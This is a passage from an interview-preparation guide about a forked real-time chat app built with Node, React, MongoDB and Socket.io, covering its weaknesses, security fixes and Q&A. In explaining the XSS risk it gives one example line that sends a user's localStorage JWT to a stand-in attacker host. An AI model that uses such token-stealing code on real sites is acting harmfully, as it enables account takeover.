| **Choice** | REST for auth/CRUD | WebSocket for real-time events |

## JWT localStorage vs HttpOnly cookies

| | localStorage | HttpOnly Cookie |
|--|-------------|----------------|
| XSS risk | High — JS can read it | None — JS cannot access |
| CSRF risk | Low — must be set in header | High — auto-sent with requests |
| Implementation | Simple | Requires cookie config, CORS credentials |
| Current state | ✅ Implemented | ❌ Not implemented |
| **Recommendation** | Migrate to HttpOnly cookies in production |

## Socket.io vs raw WebSocket

| | Socket.io | Raw WebSocket |
|--|-----------|--------------|
| Rooms | Built-in | Manual management |
| Reconnection | Automatic | Manual |
| Fallback | HTTP polling | None |
| Bundle size | ~150KB | ~0KB (browser native) |
| **Choice** | ✅ Socket.io for reliability | Consider raw WS at extreme scale |

---

# 45. Weaknesses of the Current Project

## 1. No socket authentication

**Current**: Socket events trust `userId` from the frontend payload.
**Problem**: A malicious client can emit `chatMessage` with any `userId`.
**Severity**: Medium — they can impersonate other users in messages.
**Fix**: Verify JWT in socket handshake: `socket.handshake.auth.token` → `jwt.verify()`.
**Why not done**: Original project design; would require coordinated frontend+backend changes.

## 2. JWT in localStorage (XSS risk)

**Current**: Token stored in `localStorage.getItem('token')`.
**Problem**: Any XSS script can steal the token: `document.location = 'evil.com?t=' + localStorage.token`.
**Severity**: High in production with untrusted content; Low for this controlled app.
**Fix**: HttpOnly Secure cookie — requires backend to set-cookie, frontend CORS credentials.
**Why not done**: Breaking change requiring coordinated migration.

## 3. No rate limiting

**Current**: Unlimited login attempts.
**Problem**: Brute force attacks against any account.
**Severity**: High in production.
**Fix**: `express-rate-limit` on `/api/auth/login` — e.g., 10 attempts per 15 minutes per IP.

## 4. Duplicate key errors return 500

**Current**: `await user.save()` on duplicate email/username throws MongoDB error code 11000.
**Problem**: The generic catch returns 500 "Server error" instead of 409 Conflict with a helpful message.
**Fix**: Check `err.code === 11000` in catch and return 409 with field-specific message.

## 5. No message delivery guarantee

**Current**: Fire-and-forget — `io.to(roomId).emit(...)` has no acknowledgement.
**Problem**: If recipient's socket drops during transmission, message is silently lost.
**Fix**: Socket.io acknowledgements + missed-message recovery on reconnect.

## 6. `activeRoomUsers` not scalable

**Current**: In-memory JavaScript object in `socketHandler.js`.
**Problem**: Lost on process restart; broken in multi-instance deployment.
**Fix**: Redis-backed presence with TTL.

## 7. Message array grows unbounded in frontend

**Current**: Every new message is pushed to the `messages` array — it grows indefinitely.
**Problem**: In a very active room, the array could have thousands of items — all rendered.
**Fix**: Windowing (react-window) — only render visible messages.

## 8. Existing private rooms broken by bcrypt migration

**Current**: Pre-migration rooms with plaintext keys fail `bcrypt.compare()`.
**Problem**: Real users cannot rejoin their own private rooms.
**Severity**: Moderate — requires manual intervention.
**Fix**: One-time migration script to re-hash existing plaintext keys, or notify affected users.

## 9. No input sanitization beyond trim

**Current**: `trim: true` in schemas and `.trim()` in routes.
**Problem**: Long messages, malformed ObjectIds, and special characters are not validated.
**Fix**: `express-validator` for input validation, ObjectId format check before `findById`.

## 10. No test coverage

**Current**: Zero automated tests.
**Problem**: Regressions are only caught manually.
**Fix**: Add Jest + Supertest for backend, Vitest + React Testing Library for frontend.

---

# 46. Improvements Made to the Cloned Project

All of the following improvements are **actually implemented** in this repository:

### 1. Removed hardcoded JWT secret fallback
**Original**: `process.env.JWT_SECRET || 'supersecretkeyfortalkhubjwt123!'`
**Fixed**: `process.env.JWT_SECRET` only. Added fail-fast guard in `middleware/auth.js`.
**Files**: `routes/auth.js` (×2), `middleware/auth.js`

### 2. Server startup validation
**Added**: Checks for `MONGO_URI` and `JWT_SECRET` before server accepts connections.
**File**: `server.js`

### 3. CORS bug fix
**Original**: `|| !process.env.CLIENT_URL` allowed ALL origins when `CLIENT_URL` was missing.
**Fixed**: Explicit allow-list; defaults to localhost in dev; empty list in production without `CLIENT_URL`.
**File**: `server.js`

### 4. bcrypt-hashed private room access keys
**Original**: Access keys stored as plaintext, compared with `===`.
**Fixed**: Hashed with bcrypt on creation, compared with `bcrypt.compare()` on join.
**File**: `routes/rooms.js`

### 5. Fixed Authorization header bug
**Original**: Template literal with embedded newlines — sent `"\n      \n      \nBearer token"`.
**Fixed**: `config.headers['Authorization'] = \`Bearer ${token}\``
**File**: `src/utils/api.js`

### 6. Frontend environment variable for backend URL
**Original**: `http://localhost:5080` hardcoded in `vite.config.js`.
**Fixed**: Read from `VITE_API_URL` environment variable.
**Files**: `vite.config.js`, `chat-app-frontend/.env`, `chat-app-frontend/.env.example`

### 7. Comprehensive .gitignore
**Added**: `.env.*` wildcard, `!.env.example` negation, `INTERVIEW_PREPARATION.md`.
**File**: `.gitignore`

### 8. Backend `.env.example` cleanup
**Added**: `CLIENT_URL` placeholder. Safe placeholders for all variables.
**File**: `chat-app-backend/.env.example`

### 9. Complete UI/UX redesign
**Changed**: Entire frontend visual design from purple/violet NexVibe theme to clean, minimal, professional Relay design.
**New features**: Light/dark mode toggle with localStorage persistence and system-preference detection.
**New brand**: "Relay" with tagline "Real-time conversations, built for your team."
**Files**: `app.css` (complete rewrite), all component JSX files

### 10. Password show/hide toggles
**Added**: Eye icon toggles on all password fields in Login and Register.
**Files**: `Login.jsx`, `Register.jsx`

### 11. Mobile-responsive sidebar
**Added**: Slide-in sidebar on mobile with hamburger menu toggle.
**File**: `ChatRoom.jsx`

### 12. MongoDB Atlas configuration
**Done**: Connected to personal MongoDB Atlas cluster.
**File**: `chat-app-backend/.env`

---

# 47. Cloned Project / Ownership Questions

## "Did you build this project yourself?"

**Honest professional answer**:

"This project is based on an open-source TalkHub project I found on GitHub. I cloned it as a learning exercise. What I personally did is: configured it with my own MongoDB Atlas database, identified and fixed several security vulnerabilities in the original code, redesigned the entire frontend UI from scratch with a new design system, added a light/dark mode, rebranded it as Relay, and went deep into the architecture to understand every file. I can explain every line of this codebase."

## "What did you personally implement?"

**Specific, honest answer**:

"Specifically, I: fixed a critical bug where the CORS configuration allowed all origins when the `CLIENT_URL` environment variable was absent; removed three hardcoded JWT secret fallbacks that would have allowed token forgery if the secret was not set; upgraded private room access keys from plaintext storage to bcrypt hashing; fixed a malformed Authorization header in the Axios interceptor that was sending whitespace before 'Bearer'; created a frontend `.env.example` system; rewrote the entire CSS design system from 700+ lines to a token-based system with light and dark mode; redesigned all 12 React components; and added password show/hide toggles and a mobile-responsive layout."

## "Which architectural decisions were yours?"

"The original architecture — MERN + Socket.io — was already in place. My architectural decisions were: choosing bcrypt for access key hashing (rather than a simpler hash like SHA-256, which is inappropriate for secrets); choosing CSS custom properties for theming (rather than a theme library or runtime JS theming); and choosing a hybrid REST + Socket.io approach for the join-room flow, where REST validates the access key and socket handles real-time updates after."

## "Why should we consider this your project?"

"Because I can walk through every file, explain why every design decision was made, identify the security vulnerabilities, describe the tradeoffs, and discuss how I'd scale it. The engineering judgment I applied — fixing security bugs, improving the architecture, redesigning the UI — is entirely mine. Cloning a project and then deeply understanding and improving it is itself a valuable engineering skill."

## "What would you build differently?"

"I'd add socket-level JWT verification so the socket layer doesn't trust the frontend's userId payload. I'd store JWTs in HttpOnly Secure cookies instead of localStorage. I'd add rate limiting on login attempts. I'd implement proper error feedback for failed socket messages. And I'd add a Redis-backed presence system from the start to enable horizontal scaling."

---

# 48. Project Walkthrough Answers

## 30-second answer

"Relay is a full-stack real-time chat application. Users register, log in, and can create or join chat rooms — public or private. Messages are sent via WebSocket using Socket.io, stored in MongoDB, and delivered to all room members instantly. The backend is Node.js with Express and the frontend is React with Vite. I added security improvements to the original codebase and did a complete UI redesign."

## 1-minute answer

"Relay is a MERN-stack real-time messaging application built on Socket.io for WebSocket communication. Users authenticate with JWT — registration and login are REST endpoints that return a signed token, stored client-side and sent on every subsequent request via an Authorization header. For real-time messaging, the frontend connects a persistent Socket.io WebSocket to the backend. When a user enters a room, Socket.io joins them to a server-side room channel. When they send a message, it's saved to MongoDB and immediately broadcast to all room members. The database has three collections: Users, Rooms, and Messages. Rooms can be public or private — private rooms require a bcrypt-hashed access key to join. I fixed several security issues in the original codebase including CORS misconfiguration, hardcoded JWT secrets, and plaintext access key storage."

## 2-minute answer

"Relay is a full-stack real-time chat application using the MERN stack plus Socket.io. Let me walk you through the key flows.

**Authentication**: Users register or log in via REST endpoints on the Express backend. The backend validates credentials, hashes passwords with bcrypt, and returns a JWT. The JWT is stored in localStorage and automatically attached to every subsequent API request via an Axios interceptor.

**Real-time messaging**: After login, the React frontend connects a Socket.io client to the backend. When a user selects a room, the client emits a `joinRoom` event with the room ID. The server registers the socket in that room channel and sends the last 50 messages from MongoDB. When the user sends a message, it's emitted via socket, the server saves it to MongoDB, then broadcasts it to all sockets in the room including the sender.

**Database**: MongoDB Atlas stores three collections — Users, Rooms, and Messages. Messages have a compound index on `{ room, timestamp }` for efficient history queries. Reactions are embedded inside message documents.

**Security improvements I made**: I fixed a CORS bug that allowed all origins when CLIENT_URL was missing, removed three hardcoded JWT secret fallbacks, upgraded private room access keys from plaintext to bcrypt hashing, and fixed a malformed Authorization header in the API client. I also did a complete UI redesign with a proper CSS design system, light/dark mode, and password visibility toggles."

## 5-minute deep walkthrough

"Let me walk through the entire Relay stack starting from the backend.

**Backend startup**: `server.js` runs. It first validates that `MONGO_URI` and `JWT_SECRET` are in the environment — if either is missing, the server exits immediately rather than operating unsafely. Then it builds the CORS allow-list from `CLIENT_URL`. It creates an Express app and an `http.Server` from it — the raw server is needed because Socket.io attaches to it directly. Socket.io is initialized with the same CORS handler. Mongoose connects to MongoDB Atlas. Four middleware run on every request: CORS headers, JSON body parsing, `req.io` injection (attaches the Socket.io instance to Express requests so REST routes can emit socket events), and the auth middleware per-route.

**Authentication**: The auth system is in `routes/auth.js` and `middleware/auth.js`. Registration receives username, email, password — validates, checks for duplicates, hashes the password with bcrypt cost 10, saves to MongoDB, then signs a JWT with the user's ID, username, and email as payload. The JWT expires in 7 days. Login does the same but finds the existing user and uses `bcrypt.compare` to verify the password. The middleware reads the `Authorization: Bearer <token>` header, calls `jwt.verify`, and attaches `req.user` to the request.

**Room management**: `routes/rooms.js` handles CRUD for rooms. Creating a private room now bcrypt-hashes the access key before storing — this is a security improvement I made. The original stored keys as plaintext and compared with `===`. Now on join, `bcrypt.compare(providedKey, storedHash)` is used. The `members` array on Room tracks who has joined, and `isMember` is checked on the frontend to decide whether to show the chat or the join form.

**Real-time**: `socketHandler.js` manages all socket events. It keeps an in-memory `activeRoomUsers` object mapping room IDs to connected user lists. When a user joins a room, their socket is added to the Socket.io room, the presence list is broadcast to everyone, and the last 50 messages are sent to just the joining socket. When a message arrives, it's saved to MongoDB, then broadcast to the entire room with `io.to(roomId).emit`. Typing events are relayed without database persistence. Reactions update the message document and broadcast the new reaction array.

**Frontend**: The React app is structured around two Context providers — `AuthContext` for authentication state and `SocketContext` for the WebSocket connection. On startup, `App.jsx` reads the saved theme from localStorage and sets `data-theme` on `<html>` before first render, preventing a flash. The auth context verifies the stored JWT on mount. If valid, the user is logged in. All API calls go through an Axios instance with an interceptor that automatically adds the Authorization header from localStorage.

**UI redesign**: I rewrote the entire CSS into a token-based design system with CSS custom properties for both light and dark mode. Both themes use the same variable names but different values, switched by a `data-theme` attribute. Every color, spacing value, and border radius is defined once as a variable — nothing is hardcoded in component files."

---

# 49. Rapid-Fire Questions

### Core Concepts

**Q: What is Node.js?**
A: A JavaScript runtime built on Chrome's V8 engine. Executes JavaScript server-side with an event-driven, non-blocking I/O model.

**Q: What is the event loop?**
A: Node.js's mechanism for handling async operations. The call stack runs synchronously. When async operations complete, their callbacks are queued. When the stack empties, the event loop moves the next callback onto the stack.

**Q: What is non-blocking I/O?**
A: When Node starts an I/O operation (file read, DB query, network request), it registers a callback and immediately moves on to handle other work, rather than waiting for the operation to complete.

**Q: What is Express?**
A: A minimal Node.js web framework that provides routing, middleware, and request/response helpers on top of Node's http module.

**Q: What is middleware?**
A: A function with `(req, res, next)` signature that runs between the request arriving and the route handler executing. Middleware can read/modify req/res or call `next()` to pass to the next function.

**Q: What is JWT?**
A: JSON Web Token — a self-contained, signed token that encodes a payload. Used for stateless authentication — the server verifies the signature without a database lookup.

**Q: What are the three parts of a JWT?**
A: Header (algorithm), Payload (claims), Signature. Separated by dots, Base64URL encoded.

**Q: What is bcrypt?**
A: An adaptive password-hashing function. Intentionally slow (configurable cost factor). Includes a salt automatically. Resistant to brute force and rainbow tables.

**Q: What is a salt in bcrypt?**
A: A random value added to the password before hashing. Ensures that identical passwords produce different hashes. Prevents rainbow table attacks.

**Q: What is MongoDB?**
A: A NoSQL document database. Stores data as BSON documents in collections instead of rows in tables.

**Q: What is Mongoose?**
A: An Object Document Mapper (ODM) for MongoDB and Node.js. Provides schemas, validation, type casting, and query helpers.

**Q: What is an ObjectId?**
A: MongoDB's default `_id` type — a 12-byte unique identifier that encodes a timestamp, machine ID, and counter.

**Q: What is REST?**
A: Representational State Transfer — an architectural style for APIs using standard HTTP methods (GET, POST, PUT, DELETE) and stateless request-response communication.

**Q: What is WebSocket?**
A: A protocol that upgrades an HTTP connection to a persistent bidirectional TCP channel. Enables real-time push communication from server to client.

**Q: What is Socket.io?**
A: A library built on WebSocket that adds rooms, named events, automatic reconnection, and fallback transports.

**Q: What is a Socket.io room?**
A: A logical grouping of socket connections server-side. Emitting to a room sends the event to all sockets in that room.

**Q: What is CORS?**
A: Cross-Origin Resource Sharing — a browser security mechanism. The browser blocks cross-origin responses unless the server explicitly allows the requesting origin.

**Q: What is the same-origin policy?**
A: Browser security rule: a page can only read responses from the same origin (protocol + domain + port).

**Q: What is async/await?**
A: Syntactic sugar over Promises. `await` pauses execution of an async function and returns control to the event loop until the Promise resolves.

**Q: What is a Promise?**
A: An object representing the eventual completion or failure of an async operation. Has `.then()`, `.catch()`, `.finally()` methods.

**Q: What is React?**
A: A JavaScript library for building user interfaces through composable components with a virtual DOM for efficient updates.

**Q: What is state in React?**
A: Data that belongs to a component and causes re-renders when changed. Managed with `useState`.

**Q: What is a prop in React?**
A: Data passed from a parent component to a child component. Read-only — the child cannot modify it.

**Q: What is useEffect?**
A: A hook for performing side effects after render (data fetching, subscriptions, DOM mutations). The dependency array controls when it re-runs.

**Q: What causes a React re-render?**
A: State change (`setState`), prop change, or context value change.

**Q: What is useContext?**
A: A hook that subscribes to a React Context. Returns the current context value without prop drilling.

**Q: What is useRef?**
A: A hook that returns a mutable ref object. Changes to `.current` don't cause re-renders. Used for DOM references and persisting values between renders.

**Q: What is Vite?**
A: A frontend build tool and dev server. Serves native ES modules in development for fast HMR. Uses Rollup for production builds.

**Q: What does HMR stand for?**
A: Hot Module Replacement — updates changed modules in the browser without full page reload.

**Q: What is an environment variable?**
A: A runtime configuration value provided by the operating system or `.env` file. Keeps sensitive data out of source code.

**Q: Why use a `.env` file?**
A: Centralizes configuration, keeps secrets out of code, allows different values per environment (dev/staging/production).

**Q: Why shouldn't `.env` be committed to Git?**
A: It contains credentials (database passwords, JWT secrets) that would be publicly exposed in the repository.

**Q: What does `.env.example` serve?**
A: A template with placeholder values that can be committed safely. Shows new developers which variables they need to set.

**Q: What is `process.env` in Node.js?**
A: An object containing all environment variables available to the process.

**Q: What does `require('dotenv').config()` do?**
A: Reads the `.env` file and populates `process.env` with its key-value pairs.

**Q: What is `import.meta.env` in Vite?**
A: Vite's equivalent of `process.env` for the browser. Only variables prefixed with `VITE_` are exposed.

**Q: What is the difference between `==` and `===` in JavaScript?**
A: `==` coerces types before comparing. `===` compares value and type strictly. Always use `===`.

**Q: What does `?.` (optional chaining) do?**
A: Returns `undefined` instead of throwing if the left side is null or undefined. `activeRoom?.members` returns undefined if `activeRoom` is null.

**Q: What does `??` (nullish coalescing) do?**
A: Returns the right side if the left is null or undefined. Different from `||` which also triggers on `0`, `''`, `false`.

**Q: What is `async` function?**
A: A function that always returns a Promise. Enables `await` inside it.

**Q: What is `try/catch` with async/await?**
A: The synchronous syntax for handling Promise rejections in async functions.

**Q: What is Axios?**
A: A Promise-based HTTP client for browser and Node.js. Supports interceptors, automatic JSON parsing, better error handling than `fetch`.

**Q: What is an Axios interceptor?**
A: A function that runs before every request (request interceptor) or after every response (response interceptor). Relay uses a request interceptor to add the Authorization header.

**Q: What does `res.status(400).json({ message: '...' })` do?**
A: Sets the HTTP status code to 400 and sends a JSON response body.

**Q: What does `next()` do in Express middleware?**
A: Passes control to the next middleware or route handler. If not called, the request hangs.

**Q: What is `req.body` in Express?**
A: The parsed request body. Populated by `express.json()` middleware for JSON requests.

**Q: What is `req.params` in Express?**
A: URL path parameters: `/api/rooms/:id` → `req.params.id`.

**Q: What is `req.query` in Express?**
A: URL query string parameters: `?limit=50&before=...` → `req.query.limit`, `req.query.before`.

**Q: What is `app.listen()` vs `server.listen()`?**
A: `app.listen()` is Express shorthand that creates an http.Server internally. `server.listen()` is called on an explicitly created `http.Server` — required when Socket.io needs the server reference.

**Q: What is `socket.join(room)` vs `socket.to(room).emit()`?**
A: `join` registers this socket as a member of the room. `to(room).emit` sends to all sockets in the room except the caller.

**Q: What is `io.to(room).emit()` vs `socket.to(room).emit()`?**
A: `io.to` includes the calling socket. `socket.to` excludes it.

**Q: What is `.populate()` in Mongoose?**
A: Replaces an ObjectId reference with the actual document from the referenced collection. Triggers an additional query.

**Q: What is `mongoose.Schema` vs `mongoose.Model`?**
A: Schema defines the structure. Model is the class you use to create, read, update, delete documents. `mongoose.model('Name', schema)` creates a Model from a Schema.

**Q: What does `unique: true` in a Mongoose schema do?**
A: Creates a MongoDB unique index. Throws a duplicate key error (code 11000) if you try to insert a document with the same value.

**Q: What is a MongoDB index?**
A: A data structure (B-tree) that allows MongoDB to find documents without scanning the entire collection. Dramatically speeds up queries on indexed fields.

**Q: What is a compound index?**
A: An index on multiple fields. `{ room: 1, timestamp: -1 }` allows queries that filter by room and sort by timestamp to use the index.

**Q: What does `sort({ timestamp: -1 })` do in MongoDB?**
A: Returns documents sorted by timestamp descending (newest first). `-1` = descending, `1` = ascending.

**Q: What does `.reverse()` do in rooms.js message route?**
A: Fetches newest 50 first (for efficiency with the timestamp index), then reverses to return oldest first (correct chronological display order).

**Q: What is `$or` in MongoDB?**
A: A logical operator that matches documents where at least one condition is true. `{ $or: [{ email: x }, { username: x }] }` — used in login to find by email or username.

**Q: What is `$lt` in MongoDB?**
A: "Less than" comparison operator. `{ timestamp: { $lt: new Date(before) } }` — messages older than the cursor timestamp.

**Q: What is React Router's `<Navigate>`?**
A: A component that programmatically redirects to another route when rendered.

**Q: What is `useNavigate` in React Router?**
A: A hook that returns a function for programmatic navigation. `navigate('/chat')` redirects the user.

**Q: What is React Context?**
A: A mechanism for sharing state across the component tree without prop drilling. A Provider wraps child components and Consumers (via `useContext`) can read the value.

**Q: What is the virtual DOM?**
A: React's in-memory representation of the real DOM. When state changes, React diffs the new virtual DOM against the previous one and only updates the actual DOM elements that changed.

**Q: What is React.StrictMode?**
A: A development tool that renders components twice to detect impure renders and side effects. Has no production effect.

**Q: What is `preventDefault()` in a form submit?**
A: Prevents the browser's default behavior of reloading the page when a form is submitted.

**Q: What is controlled vs uncontrolled input in React?**
A: Controlled: React state is the source of truth (`value={text} onChange={setText}`). Uncontrolled: DOM is the source of truth (accessed via ref). Relay uses controlled inputs throughout.

**Q: What does `localStorage.setItem(key, value)` do?**
A: Stores a key-value pair in the browser's localStorage, which persists across page reloads and browser restarts (until explicitly cleared).

**Q: What is a service discovery SRV record?**
A: `mongodb+srv://` uses DNS SRV records to automatically discover all replica set members — more flexible than hardcoding hostnames.

**Q: What is a replica set in MongoDB?**
A: A group of MongoDB instances that maintain the same data. Provides high availability — if the primary fails, a secondary is automatically promoted.

---

# 50. Difficulty Levels

## Level 1 — Basic (Junior)

- What is Node.js?
- What is Express middleware?
- What is JWT?
- What is MongoDB?
- What is React state?
- What does useState return?
- What is useEffect?
- Why use .env files?
- What is a REST API?
- What does POST vs GET mean?
- What is bcrypt?
- What is a WebSocket?
- What is localStorage?

## Level 2 — Intermediate

- Explain the JWT verification flow in `middleware/auth.js`.
- Why does login return "Invalid credentials" for both wrong email and wrong password?
- What does `.populate()` do and when does it run a query?
- How does cursor-based pagination differ from offset pagination?
- Explain the `activeRoomUsers` data structure and why it's needed.
- What is the difference between `socket.to(room).emit` and `io.to(room).emit`?
- How does the Axios interceptor attach the Authorization header?
- Why does `SocketContext` disconnect the socket when `user` becomes null?
- What is the purpose of `req.io` injection middleware?
- How does the Vite proxy solve CORS in development?

## Level 3 — Advanced

- Explain the complete message flow from typing Enter to the message appearing in User B's browser.
- What happens if MongoDB saves a message but the socket emission fails?
- What is the race condition risk with simultaneous messages and how does Node.js handle it?
- How does bcrypt.compare work internally when checking a private room access key?
- Why is the `activeRoomUsers` approach not scalable and how would you fix it?
- What is the security implication of JWT in localStorage vs HttpOnly cookies?
- How would you implement message delivery guarantees using Socket.io acknowledgements?
- What would break in a multi-instance Node.js deployment and what's the fix?
- Explain the difference between embedding reactions in Message documents vs a separate collection.
- Why does the compound index `{ room: 1, timestamp: -1 }` improve performance?

## Level 4 — Expert / Follow-up

**Q: Why MongoDB?**
A: Document model, flexible schema, embedded documents for reactions.
Follow-up: "What if a message document grows to millions of reactions?" → Document size limit 16MB, extract reactions to separate collection.
Follow-up: "How would you index for full-text message search?" → MongoDB Atlas Search ($search) with a text index on `content`.
Follow-up: "What consistency level does MongoDB provide?" → By default, eventual consistency on reads from secondaries. For chat, use read concern `majority` on critical reads.
Follow-up: "How would you shard the messages collection?" → Shard key `{ room: 1, timestamp: 1 }` — distributes load by room + time.

**Q: Why Socket.io?**
A: Rooms, reconnection, named events, fallback transports.
Follow-up: "What's the difference between Socket.io v3 and v4?" → v4 added connection state recovery, CORS improvements, and better TypeScript support.
Follow-up: "How does Socket.io work behind Nginx?" → Must set `proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'` for WebSocket passthrough.
Follow-up: "What is the Socket.io Redis adapter?" → Enables multiple Node instances to share socket events through Redis Pub/Sub.

---

# 51. Interviewer Cross-Examination Chains

## Chain 1: Message Flow

**Interviewer**: How does a message get from User A to User B?

**You**: User A types a message and presses Enter. The `MessageInput` component calls `onSendMessage(text)`. In `ChatRoom.jsx`, `handleSendMessage` calls `socket.emit('chatMessage', { roomId, userId, username, message })`. The socket event is sent over the WebSocket connection. In `socketHandler.js`, the server validates the payload, creates a `new Message(...)`, awaits `newMessage.save()` to persist to MongoDB, then calls `io.to(roomId).emit('message', newMessage)` — broadcasting to all sockets in the room. User B's socket receives the `message` event. The `onMessage` handler in `ChatRoom.jsx` calls `setMessages(p => [...p, msg])`. React re-renders `MessageList`, which adds the new bubble.

**Interviewer**: Why Socket.io instead of just REST?

**You**: REST is request-response. To get real-time messages with REST, you'd need polling — the client asks "any new messages?" every second. That's wasteful and has latency equal to the poll interval. Socket.io maintains a persistent WebSocket connection. The server can push messages the instant they arrive, with sub-second latency.

**Interviewer**: What happens if the socket disconnects between the MongoDB save and the emit?

**You**: The message is durably saved in MongoDB. The `io.to(roomId).emit` call would succeed to connected sockets, but the sender's socket is disconnected so they miss their own message real-time. When they reconnect and rejoin the room, `loadHistory` sends the last 50 messages, so they'll see it then. For User B, they receive it normally through the emit since their socket is still connected.

**Interviewer**: What if it's MongoDB that fails?

**You**: `await newMessage.save()` throws. The catch block logs the error. Since the catch comes before the emit, `io.to(roomId).emit` never runs. Neither the sender nor other users see the message. The sender gets no feedback — the UI doesn't show any error. This is a known weakness. Production fix: emit an error event back to the sender and show a "failed to send" state in the UI.

**Interviewer**: How would you solve that in production at scale?

**You**: I'd use a message queue — Kafka or RabbitMQ. The socket handler publishes the message to the queue. A separate consumer service reads from the queue, saves to MongoDB, and emits to Socket.io. If MongoDB is down, messages queue up and are processed when it recovers. This gives at-least-once delivery. For exactly-once, I'd add idempotency keys — the client generates a UUID for each message, the server deduplicates before saving.

---

## Chain 2: Authentication

**Interviewer**: What happens when a user logs in?

**You**: The Login component calls `login(usernameOrEmail, password)` from AuthContext. This calls `api.post('/api/auth/login', ...)`. The Express route finds the user by email or username using `$or`, compares the password with `bcrypt.compare`, signs a JWT with the user's id, username, and email as payload — expiring in 7 days — and returns the token. AuthContext stores it in localStorage and sets `user` state.

**Interviewer**: Why localStorage? Isn't that insecure?

**You**: Yes, localStorage is vulnerable to XSS attacks — any JavaScript running on the page can read it. The safer approach is HttpOnly cookies, which the browser sends automatically but JavaScript cannot access. However, migrating to HttpOnly cookies requires changes to the Express login route (set-cookie), auth middleware (read cookie instead of header), CORS configuration (credentials: true with explicit origin), and all frontend auth flows. For this project, localStorage works acceptably because React escapes all content by default, preventing XSS via messages. In production, I'd migrate to HttpOnly Secure cookies.

**Interviewer**: What if someone steals the JWT from localStorage?

**You**: They can authenticate as that user for up to 7 days. JWT is stateless — there's no session to invalidate. To "logout" a compromised token, you'd need either a token blacklist in Redis (reintroducing state) or very short expiry times with refresh tokens. This is a genuine tradeoff of stateless JWT vs stateful sessions.

**Interviewer**: Why 7-day expiry?

**You**: Trade-off between security and user experience. Short expiry (1 hour) means users must re-login frequently. Long expiry (30 days) means stolen tokens are valid longer. 7 days balances usability for a chat app where users expect to stay logged in across browser sessions. With refresh tokens, you'd use short access token expiry (15 min) and long refresh token expiry (30 days).

---

## Chain 3: Scaling

**Interviewer**: Can your app handle 100,000 concurrent users?

**You**: On a single Node.js server, no. At roughly 10,000-20,000 concurrent WebSocket connections, memory pressure becomes significant. The `activeRoomUsers` in-memory structure also doesn't scale — it would have incorrect presence data across multiple instances.

**Interviewer**: How would you scale it?

**You**: I'd deploy multiple Node.js instances behind a load balancer with sticky sessions — WebSocket connections must go to the same instance. Then add a Redis Socket.io adapter (`@socket.io/redis-adapter`) — events emitted on any instance are published to Redis Pub/Sub and all instances forward them to their connected sockets. Move `activeRoomUsers` to Redis with TTL for presence. The REST API is already stateless — it scales horizontally without changes. MongoDB Atlas scales with replica sets for reads and sharding for write throughput.

**Interviewer**: What is sticky sessions and why do you need it?

**You**: Sticky sessions (also called session affinity) configures the load balancer to route all requests from the same client to the same backend instance — using a cookie or IP hash. WebSocket connections need this because the upgrade handshake and the persistent connection must land on the same server. Without it, the HTTP upgrade might go to instance A but subsequent WebSocket frames might be routed to instance B, breaking the connection.

---

# 52. Complexity Analysis

## `activeRoomUsers` lookups

```js
const userExists = activeRoomUsers[roomId].some(u => u.userId === userId);
```
- `activeRoomUsers[roomId]`: O(1) hash map lookup
- `.some(...)`: O(n) where n = users in the room
- For typical chat rooms (< 1000 users): negligible

## MongoDB message query

```js
Message.find({ room: roomId, timestamp: { $lt: before } }).sort({ timestamp: -1 }).limit(50)
```
- With compound index `{ room: 1, timestamp: -1 }`: O(log N + 50) — N = total messages
- Without index: O(N) full collection scan
- The index makes this query O(log N) regardless of total message count

## bcrypt.hash and bcrypt.compare

- bcrypt cost 10 = 2^10 = 1024 iterations
- Time: ~100ms per operation (intentionally slow)
- Space: O(1)
- Cannot be parallelized for brute force without proportional time cost

## Message state update in React

```js
setMessages(p => [...p, msg])
```
- Creates a new array copy: O(n) time, O(n) space
- For 1000 messages: 1000-element array copy on every new message
- React then re-renders the list: O(n) for naive rendering
- **Improvement**: Virtualized list renders only ~20 visible items: O(1) rendering regardless of n

## User authentication — login

1. `User.findOne({ $or: [email, username] })`: O(log N) with indexes on email and username
2. `bcrypt.compare(password, hash)`: O(1) fixed-time comparison (constant 1024 iterations regardless of password length)

## Room list fetch

```js
Room.find().sort({ createdAt: -1 })
```
- No index on `createdAt`: O(N) scan + O(N log N) sort
- **Improvement**: Index on `{ createdAt: -1 }` makes this O(N log N) → O(log N + K) where K = returned results

## String comparison for ObjectId membership check

```js
room.members.map(String).includes(String(user.id))
```
- `.map(String)`: O(m) where m = number of members
- `.includes(String(user.id))`: O(m)
- Total: O(m) — for typical rooms, acceptable

---

# 53. Production Readiness Checklist

| Item | Status | Notes |
|------|--------|-------|
| JWT secret from environment | ✅ Implemented | Fails on startup if missing |
| No hardcoded secrets | ✅ Implemented | All removed in our improvements |
| Password hashing | ✅ Implemented | bcrypt cost 10 |
| Private room key hashing | ✅ Implemented | bcrypt (our improvement) |
| CORS allow-list | ✅ Implemented | Fixed bug from original |
| Environment files git-ignored | ✅ Implemented | .env.*  wildcard |
| Input trimming | ✅ Implemented | trim: true in schemas |
| Duplicate key validation | ⚠️ Partial | Returns 500 instead of 409 |
| Rate limiting | ❌ Missing | No limit on login attempts |
| JWT in HttpOnly cookie | ❌ Missing | Currently localStorage |
| Socket authentication | ❌ Missing | Trusts frontend userId |
| Error feedback for socket failures | ❌ Missing | Silent on message save failure |
| Message delivery guarantee | ❌ Missing | Fire-and-forget |
| Database indexes | ✅ Implemented | Compound index on messages |
| Structured logging | ❌ Missing | console.log only |
| Error monitoring | ❌ Missing | No Sentry/similar |
| Automated tests | ❌ Missing | Zero test coverage |
| HTTPS | ❌ Local only | Required for production |
| Health check endpoint | ⚠️ Partial | GET / returns text, not machine-readable |
| Horizontal scaling | ❌ Missing | No Redis adapter |
| Message virtualization | ❌ Missing | All messages rendered |
| Caching | ❌ Missing | Every room list fetch hits MongoDB |
| Graceful shutdown | ❌ Missing | No SIGTERM handling |
| Backup strategy | ⚠️ Delegated | Atlas provides backups on paid tiers |
| CI/CD pipeline | ❌ Missing | Manual deployment |

---

# 54. Questions to Ask the Interviewer

1. "What does your real-time infrastructure look like? Are you running Socket.io at scale with a Redis adapter, or using an alternative like NATS or Kafka for pub/sub?"

2. "How do you handle session management at scale — stateless JWT, refresh tokens, or Redis-backed sessions?"

3. "What's your approach to testing real-time features? I'm curious how you test Socket.io events — do you use mock clients or a staging environment?"

4. "How do you handle schema migrations in MongoDB as the application evolves? Do you use any migration tooling or rely on the flexible schema?"

5. "What observability stack do you use — for both infrastructure metrics and application-level error tracking?"

